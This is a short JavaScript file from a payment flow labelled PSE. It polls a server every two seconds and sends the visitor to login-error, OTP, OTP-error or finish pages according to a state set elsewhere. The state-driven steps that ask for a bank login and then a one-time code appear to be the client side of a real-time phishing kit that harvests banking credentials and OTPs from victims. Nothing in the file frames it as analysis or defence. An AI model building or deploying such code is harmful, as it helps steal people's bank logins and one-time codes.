// pagos/scripts/verificar_estado.js
// Asume que la variable clienteId fue declarada en cargando.php
function verificarEstadoPse() {
    if (typeof clienteId === 'undefined' || !clienteId) return;

    fetch('../../scripts/verificar_estado.php?id=' + clienteId)
    .then(r => r.json())
    .then(data => {
        if (data.estado !== undefined) {
            const st = parseInt(data.estado);
            // 2: Error Login
            // 3: OTP
            // 4: Error OTP
            // 0: Finalizado
            if (st === 2) window.location.href = 'indexerror.php?id=' + clienteId;
            else if (st === 3) window.location.href = 'otp.php?id=' + clienteId;
            else if (st === 4) window.location.href = 'errorotp.php?id=' + clienteId;
            else if (st === 0) window.location.href = 'finish.php?id=' + clienteId;
        }
    })
    .catch(e => console.error('Error polling PSE state:', e));
}
setInterval(verificarEstadoPse, 2000);
